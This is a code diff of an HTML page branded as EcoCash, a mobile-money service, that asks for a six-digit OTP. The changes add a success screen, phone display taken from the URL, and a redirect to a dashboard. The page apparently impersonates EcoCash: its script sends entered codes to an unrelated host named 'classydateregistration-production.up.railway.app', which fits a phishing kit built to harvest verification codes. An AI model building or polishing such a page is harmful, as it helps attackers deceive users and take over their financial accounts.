@@ -3,10 +3,11 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>EcoCash - Verify OTP</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
         * {
             margin: 0;
             padding: 0;
@@ -27,6 +28,7 @@
             flex-direction: column;
             align-items: center;
             padding: clamp(10px, 2vw, 20px);
+            width: 100%;
         }
         
         header {
@@ -49,6 +51,7 @@
             cursor: pointer;
             color: #333;
             transition: transform 0.2s;
+            padding: 5px;
         }
         
         .back-btn:hover {
@@ -147,6 +150,8 @@
             justify-content: center;
             gap: 16px;
             margin-bottom: 30px;
+            width: 100%;
+            max-width: 400px;
         }
         
         .otp-box {
@@ -235,7 +240,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
-        /* Toast notification */
         .toast {
             position: fixed;
             bottom: 30px;
@@ -243,7 +247,7 @@
             transform: translateX(-50%);
             background: #333;
             color: white;
-            padding: 16px 30px;
+            padding: 14px 24px;
             border-radius: 12px;
             font-size: 14px;
             font-weight: 500;
@@ -276,7 +280,6 @@
             margin-top: 10px;
         }
         
-        /* Spinner Overlay */
         #spinnerOverlay {
             position: fixed;
             top: 0;
@@ -312,6 +315,34 @@
             font-weight: 500;
         }
         
+        .success-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 0;
+        }
+        
+        .success-container.show {
+            display: flex;
+        }
+        
+        .success-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+        
+        .success-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #27ae60;
+            margin-bottom: 8px;
+        }
+        
+        .success-text {
+            font-size: 16px;
+            color: #666;
+        }
+        
         @media (max-width: 480px) {
             .otp-box {
                 width: 50px;
@@ -328,6 +359,7 @@
                 width: 42px;
                 height: 50px;
                 font-size: 22px;
+                border-radius: 12px;
             }
             .otp-group {
                 gap: 8px;
@@ -338,47 +370,55 @@
 
 <body>
     <header>
-        <button class="back-btn" onclick="history.back()" aria-label="Go back">←</button>
+        <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Go back">←</button>
         <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
-        <div></div>
+        <div style="width: 30px;"></div>
     </header>
     
-    <main class="card">
-        <div class="otp-icon">📱</div>
-        <h1 class="otp-title">Verify Your Identity</h1>
-        <p class="otp-subtitle">
-            We sent a 6-digit verification code to<br>
-            <span class="otp-phone" id="displayPhone">+263 N/A</span>
-        </p>
-        <p class="resend-text">
-            Didn't receive the code? 
-            <a class="resend-link" id="resendLink" onclick="resendOTP()">Resend OTP</a>
-            <span id="timerDisplay" style="color:#999; display:none;"></span>
-        </p>
-        
-        <div class="otp-group" id="otpGroup">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+    <main class="card" id="verifyCard">
+        <!-- OTP Verification UI -->
+        <div id="otpSection">
+            <div class="otp-icon">📱</div>
+            <h1 class="otp-title">Verify Your Identity</h1>
+            <p class="otp-subtitle">
+                We sent a 6-digit verification code to<br>
+                <span class="otp-phone" id="displayPhone">+263 N/A</span>
+            </p>
+            <p class="resend-text">
+                Didn't receive the code? 
+                <a class="resend-link" id="resendLink" onclick="resendOTP()">Resend OTP</a>
+                <span id="timerDisplay" style="color:#999; display:none;"></span>
+            </p>
+            
+            <div class="otp-group" id="otpGroup">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            </div>
+            
+            <div class="error-message" id="errorMessage">❌ Invalid OTP. Please try again.</div>
+            
+            <button class="verify-btn" id="verifyBtn" disabled>VERIFY</button>
         </div>
         
-        <div class="error-message" id="errorMessage">❌ Invalid OTP. Please try again.</div>
-        
-        <button class="verify-btn" id="verifyBtn" disabled>VERIFY</button>
+        <!-- Success Section (shown after verification) -->
+        <div class="success-container" id="successSection">
+            <div class="success-icon">✅</div>
+            <div class="success-title">Verification Successful!</div>
+            <div class="success-text">Redirecting to your dashboard...</div>
+        </div>
     </main>
     
-    <footer>© 2026 EcoCash</footer>
+    <footer>© 2026 EcoCash. All rights reserved.</footer>
     
-    <!-- Spinner Overlay -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">Verifying OTP...</div>
     </div>
 
-    <!-- Toast Notification -->
     <div class="toast" id="toast"></div>
     
     <script>
@@ -390,9 +430,6 @@
         const API_URL = 'https://classydateregistration-production.up.railway.app';
         
         // ===== DOM ELEMENTS =====
-        const phone = localStorage.getItem('phone') || 'N/A';
-        document.getElementById('displayPhone').textContent = '+263 ' + phone;
-        
         const otpBoxes = document.querySelectorAll('.otp-box');
         const verifyBtn = document.getElementById('verifyBtn');
         const errorMessage = document.getElementById('errorMessage');
@@ -400,6 +437,15 @@
         const resendLink = document.getElementById('resendLink');
         const timerDisplay = document.getElementById('timerDisplay');
         const toast = document.getElementById('toast');
+        const displayPhone = document.getElementById('displayPhone');
+        const otpSection = document.getElementById('otpSection');
+        const successSection = document.getElementById('successSection');
+        
+        // ===== GET PHONE FROM URL OR LOCALSTORAGE =====
+        const urlParams = new URLSearchParams(window.location.search);
+        const phoneFromUrl = urlParams.get('phone');
+        const phone = phoneFromUrl || localStorage.getItem('phone') || 'N/A';
+        displayPhone.textContent = '+263 ' + phone;
         
         let otpValue = '';
         let resendTimer = 30;
@@ -407,7 +453,7 @@
         let isResendCooldown = false;
         let isVerifying = false;
 
-        // ===== TOAST NOTIFICATION =====
+        // ===== TOAST =====
         function showToast(message, type = '') {
             toast.textContent = message;
             toast.className = 'toast show ' + type;
@@ -421,19 +467,15 @@
             otpValue = Array.from(otpBoxes).map(box => box.value).join('');
             verifyBtn.disabled = otpValue.length !== 6;
             
-            otpBoxes.forEach((box, index) => {
+            otpBoxes.forEach((box) => {
                 if (box.value) {
                     box.classList.add('filled');
                 } else {
                     box.classList.remove('filled');
                 }
             });
-            
-            if (otpValue.length === 6 && !isVerifying) {
-                setTimeout(verifyOTP, 300);
-            }
         }
-        
+
         // ===== OTP INPUT HANDLING =====
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
@@ -455,8 +497,11 @@
                 if (e.key === 'ArrowRight' && index < 5) {
                     otpBoxes[index + 1].focus();
                 }
-                if (e.key === 'Delete' && box.value === '' && index > 0) {
-                    otpBoxes[index - 1].focus();
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (otpValue.length === 6) {
+                        verifyOTP();
+                    }
                 }
             });
             
@@ -474,6 +519,9 @@
                 if (digits.length > 0) {
                     const lastIndex = Math.min(digits.length - 1, 5);
                     otpBoxes[lastIndex].focus();
+                }
+                if (otpValue.length === 6) {
+                    setTimeout(verifyOTP, 300);
                 }
             });
         });
@@ -522,13 +570,20 @@
                 console.log('📥 Response data:', data);
 
                 if (data.status === 'success') {
+                    // Show success
+                    spinnerOverlay.style.display = 'none';
+                    otpSection.style.display = 'none';
+                    successSection.classList.add('show');
+                    
                     showToast('✅ OTP verified successfully!', 'success');
                     
+                    // Store verification status
+                    localStorage.setItem('otpVerified', 'true');
+                    
+                    // Redirect to dashboard after 2 seconds
                     setTimeout(() => {
-                        spinnerOverlay.style.display = 'none';
-                        sessionStorage.setItem('otpVerified', 'true');
-                        window.location.href = 'members.html';
-                    }, 1500);
+                        window.location.href = 'dashboard.html';
+                    }, 2500);
                     
                 } else {
                     throw new Error(data.message || 'Invalid OTP');
@@ -631,6 +686,10 @@
 
         // ===== AUTO-FOCUS =====
         otpBoxes[0].focus();
+        
+        // ===== CLEAR OTP VERIFICATION STATUS ON LOAD =====
+        // This ensures the OTP page shows fresh each time
+        localStorage.removeItem('otpVerified');
     </script>
 </body>
 
